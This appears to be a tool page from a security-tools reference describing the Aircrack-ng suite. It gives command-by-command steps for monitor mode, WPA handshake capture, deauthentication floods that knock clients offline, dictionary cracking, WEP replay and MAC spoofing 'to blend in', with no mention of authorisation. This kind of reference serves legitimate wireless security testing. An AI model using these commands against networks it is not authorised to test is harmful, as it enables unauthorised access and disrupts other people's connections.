# Aircrack-ng

> The classic Wi-Fi security suite: put your card in monitor mode, capture a
> WPA/WPA2 handshake, knock clients off the network, then crack the pre-shared
> key against a wordlist.

- **Link:** https://github.com/aircrack-ng/aircrack-ng
- **Type:** open source
- **Platform:** cross-platform (primarily Linux)

## Description

Aircrack-ng isn't a single program but a suite of command-line tools that cover
the whole 802.11 auditing workflow. `airmon-ng` manages monitor mode,
`airodump-ng` captures traffic and handshakes, `aireplay-ng` injects frames
(most usefully deauthentication packets), and `aircrack-ng` itself does the
offline cracking. The standard attack against a WPA/WPA2-PSK network is: capture
a 4-way handshake, force a connected client to reconnect so you capture it
faster, then run a dictionary attack against the captured `.cap` file.

You need a wireless adapter that supports **monitor mode** and **packet
injection** — for example the Alfa AWUS036CH. See
[Wi-Fi & Wireless](README.md) for the bigger picture and
[Password Cracking](../password-cracking/) for faster cracking with
[hashcat](../password-cracking/hashcat.md).

## Installation

```bash
sudo apt install aircrack-ng        # Debian/Kali/Ubuntu
```

## Usage examples

### 1. Identify and enable monitor mode

```bash
# List wireless interfaces and their chipset/driver (shows injection support)
iwconfig
airmon-ng

# See nearby networks without monitor mode (needs monitor mode off)
iwlist wlan0 scan
iwlist wlan0 scan | grep 'Address\|ESSID'

# Kill processes that interfere with monitor mode (NetworkManager, wpa_supplicant)
airmon-ng check
airmon-ng check kill

# Put the adapter into monitor mode — creates e.g. wlan0mon
airmon-ng start wlan0

# Confirm the new monitor interface exists (look for the "mon" suffix)
airmon-ng
```

### 2. Scan and capture a handshake

```bash
# Discover nearby APs and clients; note the target BSSID, channel, and client MACs
airodump-ng wlan0mon

# Lock onto one AP and channel, saving captured frames to files named "capture-*"
airodump-ng -w capture --bssid 18:A6:F7:83:35:14 -c 1 wlan0mon
```

Wait until a client with the password connects. When airodump-ng captures the
4-way handshake, `WPA handshake: <BSSID>` appears in the top-right of the
display.

### 3. Speed it up with a deauthentication attack

```bash
# Deauth a specific client so it reconnects and you catch the handshake
aireplay-ng --deauth 10 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon

# Deauth all clients on the AP (0 = send continuously until stopped)
aireplay-ng --deauth 0 -a <AP_BSSID> wlan0mon

# Target an AP by its network name instead of BSSID
aireplay-ng -0 0 -e "HomeWiFi-5GHz" wlan0mon
```

### 4. Crack the captured handshake

```bash
# Dictionary attack against the captured .cap using a wordlist
aircrack-ng -w wordlist.txt capture-01.cap

# Browse https://www.openwall.com/wordlists/ , pick a list, then crack with it:
aircrack-ng -w mylist.txt capture-01.cap
```

### 5. Clean up

```bash
# Return the adapter to managed mode when finished
airmon-ng stop wlan0mon
```

### Bonus: legacy WEP

```bash
# ARP-request replay (-3) to generate WEP IVs quickly for cracking
aireplay-ng -3 -b <AP_BSSID> -h <YOUR_MAC> wlan0mon
```

## Notes & references

- Change your MAC first (with monitor mode off) if you want to blend in:
  `macchanger -r wlan0` for a random MAC, or `-m` to set one manually. Look up
  vendors at https://macvendors.com/.
- `aircrack-ng` is a "lighter hashcat" for handshakes — convert the `.cap` with
  `hcxpcapngtool` (see [hcxtools](hcxtools.md)) and crack it far faster with
  [hashcat](../password-cracking/hashcat.md) mode `-m 22000`.
- Dictionary attacks only succeed if the password is in your wordlist. Good
  starting points: [wordlists](../password-cracking/wordlists.md).
- For a PMKID (clientless) capture that skips the handshake step, see
  [hcxtools](hcxtools.md).
- End-to-end methodology (survey → capture → crack → reporting): the
  [Wi-Fi Assessment](../scenarios/wifi-assessment.md) scenario.
- Official docs & tutorials: https://www.aircrack-ng.org/documentation.html
